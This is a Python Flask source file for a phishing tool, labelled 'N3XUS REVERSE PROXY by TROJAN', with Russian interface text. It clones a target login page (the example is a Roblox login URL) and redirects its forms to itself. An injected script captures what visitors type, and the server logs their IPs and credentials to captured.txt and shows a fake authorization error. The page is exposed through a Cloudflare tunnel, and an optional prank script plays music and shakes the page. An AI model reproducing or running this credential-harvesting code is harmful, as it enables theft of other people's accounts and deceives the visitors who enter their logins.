from flask import Flask, request
import requests
from bs4 import BeautifulSoup
import urllib.parse
import threading
import subprocess
import os
import datetime
import logging                                                                                  
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__)
target_site = ""

LOCAL_PAGE = "index_local.html"
server_started = False

# Код Troll Edition для внедрения в зеркало
TROLL_SCRIPT_CODE = """
(function() {
    const sources = [
        "https://www.myinstants.com/media/sounds/spongebob-theme.mp3",
        "https://www.myinstants.com/media/sounds/spongebob-music-84965.mp3",
        "https://www.myinstants.com/media/sounds/spongebob-theme-76331.mp3"
    ];

    let music = null;
    let current = 0;

    function playMusic() {
        if (music) {
            music.pause();
            music = null;
        }
        music = new Audio(sources[current]);
        music.volume = 0.85;
        music.loop = true;

        music.play().catch(() => {
            current = (current + 1) % sources.length;
            if (current !== 0) playMusic();
        });
    }

    playMusic();

    document.addEventListener("click", () => {
        if (music && music.paused) {
            music.play().catch(() => {});
        }
    }, { once: true });

    const style = document.createElement("style");
    style.innerHTML = `
        @keyframes rgb {
            0%   { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }
        @keyframes glow {
            0%, 100% { box-shadow: 0 0 25px #ff00ff, 0 0 50px #00ffff; }
            50% { box-shadow: 0 0 50px #00ff00, 0 0 90px #ff0000; }
        }
        @keyframes float {
            0% { transform: translateY(0) rotate(-5deg); }
            50% { transform: translateY(-35px) rotate(8deg); }
            100% { transform: translateY(0) rotate(-5deg); }
        }
        body {
            animation: rgb 3.5s linear infinite !important;
        }
        .sb-meme {
            position: fixed;
            z-index: 999999;
            pointer-events: none;
            font-family: 'Comic Sans MS', cursive, sans-serif;
            font-weight: bold;
            font-size: 26px;
            color: #fff;
            text-shadow: 0 0 12px #ff00ff, 0 0 25px #00ffff, 0 0 40px #ffff00;
            animation: float 2.2s ease-in-out infinite, rgb 2.5s linear infinite;
            user-select: none;
        }
    `;
    document.head.appendChild(style);

    
    for (let i = 0; i < 14; i++) {
        const el = document.createElement("div");
        el.className = "sb-meme";
        el.innerText = phrases[Math.floor(Math.random() * phrases.length)];
        el.style.left = Math.random() * 88 + "vw";
        el.style.top = Math.random() * 78 + "vh";
        el.style.animationDelay = (Math.random() * 2.5) + "s";
        el.style.fontSize = (20 + Math.random() * 18) + "px";
        document.body.appendChild(el);
    }

    const border = document.createElement("div");
    border.style.cssText = `
        position: fixed;
        inset: 0;
        pointer-events: none;
        z-index: 999998;
        border: 10px solid;
        border-image: linear-gradient(45deg, #ff0000, #ff00ff, #00ffff, #00ff00, #ffff00, #ff0000) 1;
        animation: rgb 1.8s linear infinite, glow 1.3s ease-in-out infinite;
    `;
    document.body.appendChild(border);

    let shake = 0;
    setInterval(() => {
        shake = shake === 0 ? 4 : 0;
        document.body.style.transform = `translate(${shake}px, ${-shake}px)`;
    }, 70);
})();
"""

def download_mirror(url, troll_mode=False):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        print("\n[*] Создание локальной копии страницы...")
        resp = requests.get(url, headers=headers, timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')

        parsed_target = urllib.parse.urlparse(url)
        base_url = f"{parsed_target.scheme}://{parsed_target.netloc}"

        for tag in soup.find_all(['link', 'script', 'img']):
            attr = 'href' if tag.name == 'link' else 'src'
            val = tag.get(attr)
            if val:
                if val.startswith('/'):
                    tag[attr] = base_url + val
                elif not val.startswith('http') and not val.startswith('data:'):
                    tag[attr] = base_url + '/' + val

        for form in soup.find_all('form'):
            form['action'] = '/'
            form['method'] = 'POST'

        sniffer_script = soup.new_tag("script")
        sniffer_script.string = """
        document.addEventListener("submit", function(e) {
            let formData = new FormData(e.target);
            let data = {};
            formData.forEach((value, key) => { data[key] = value; });
            fetch('/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }, true);
        """
        
        if soup.body:
            soup.body.append(sniffer_script)
            # Внедрение Troll Edition, если выбран соответствующий режим
            if troll_mode:
                troll_tag = soup.new_tag("script")
                troll_tag.string = TROLL_SCRIPT_CODE
                soup.body.append(troll_tag)
        else:
            soup.append(sniffer_script)
            if troll_mode:
                troll_tag = soup.new_tag("script")
                troll_tag.string = TROLL_SCRIPT_CODE
                soup.append(troll_tag)

        with open(LOCAL_PAGE, "w", encoding="utf-8") as f:
            f.write(str(soup))
        print("[+] Локальная копия успешно создана!")
    except Exception as e:
        print(f"[!] Ошибка загрузки копии: {e}")

@app.route("/", methods=["GET", "POST"])
def mirror_server():
    client_ip = request.headers.get("CF-Connecting-IP", request.remote_addr)

    xff = request.headers.get("X-Forwarded-For", "")
    via = request.headers.get("Via", "")
    is_vpn_proxy = False
    if via or (xff and "," in xff):
        is_vpn_proxy = True

    vpn_text = "(скоро будет)" if is_vpn_proxy else "(скоро будет)"
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if request.method == "POST":
        form_data = {}
        if request.is_json:
            form_data = request.get_json(silent=True) or {}
        if not form_data:
            form_data = request.form.to_dict()
        if not form_data:
            form_data = request.values.to_dict()
        if not form_data and request.data:
            form_data = {"raw_data": request.data.decode('utf-8', errors='ignore')}

        print("\n" + "="*50)
        print(f" [!] НОВЫЙ ПЕРЕХВАТ ДАННЫХ! [{current_time}]")
        print(f" 🌐 IP-адрес : {client_ip}")
        print(f" 🛡️ VPN/Прокси: {vpn_text}")
        print(f" 🔑 Данные   :")
        for key, value in form_data.items():
            print(f"    -> {key}: {value}")
        print("="*50 + "\n")

        with open("captured.txt", "a", encoding="utf-8") as f:
            f.write(f"[{current_time}] IP: {client_ip} | VPN: {vpn_text} | Data: {form_data}\n")

        return f"<script>alert('Ошибка авторизации. Попробуйте снова.'); window.location.href='/';</script>"

    print(f"[{current_time}] Заход на сайт | IP: {client_ip} | VPN: {vpn_text}")

    if os.path.exists(LOCAL_PAGE):
        with open(LOCAL_PAGE, "r", encoding="utf-8") as f:
            return f.read()
    return "Цель еще не настроена.", 404

def run_flask():
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def run_tunnel():
    subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:5000"])

if __name__ == "__main__":
    while True:
        os.system("clear")
        print("="*40)
        print("         N3XUS REVERSE PROXY")
        print("              by TROJAN     ")
        print("="*40)
        print(" [1] Указать ссылку и запустить зеркало (Обычный)")
        print(" [2] Запустить зеркало + Troll Edition 🧽")
        print(" [3] Посмотреть пойманные данные (captured.txt)")
        print(" [4] Выход")
        print("="*40)

        choice = input("Выберите пункт: ").strip()

        if choice in ["1", "2"]:
            troll_mode = (choice == "2")
            target_site = input("\nВведите целевой URL (например, https://www.roblox.com/Login): ").strip()
            if target_site:
                download_mirror(target_site, troll_mode=troll_mode)

                if not server_started:
                    threading.Thread(target=run_flask, daemon=True).start()
                    threading.Thread(target=run_tunnel, daemon=True).start()
                    server_started = True
                    print("\n[+] Сервер Flask и туннель Cloudflare успешно запущены!")
                else:
                    print("\n[+] Цель обновлена, зеркало пересоздано!")

                input("\nНажмите Enter для возврата в меню...")
            else:
                input("\n[!] Ссылка не может быть пустой. Нажмите Enter...")

        elif choice == "3":
            print("\n" + "="*40)
            print(" --- СОХРАНЕННЫЕ ДАННЫЕ ---")
            if os.path.exists("captured.txt"):
                with open("captured.txt", "r", encoding="utf-8") as f:
                    print(f.read())
            else:
                print("Файл captured.txt пока пуст.")
            print("="*40)
            input("\nНажмите Enter, чтобы вернуться в меню...")

        elif choice == "4":
            print("Выход из программы...")
            os._exit(0)
        else:
            input("\n[!] Неверный выбор. Нажмите Enter...")
        
